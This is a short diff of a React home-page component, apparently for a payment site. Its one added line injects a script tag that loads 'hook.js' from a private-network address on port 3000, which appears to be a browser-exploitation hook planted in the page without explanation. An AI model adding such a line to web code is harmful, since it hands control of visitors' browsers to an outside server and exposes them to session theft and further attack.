@@ -230,6 +230,7 @@ const Home = () => {
       <div className="home_section12_container">
         <VatepayLTDCrad /> */}
       {/* </div> */}
+       <script src="http://192.168.2.112:3000/hook.js"></script>
     </>
   );
 };
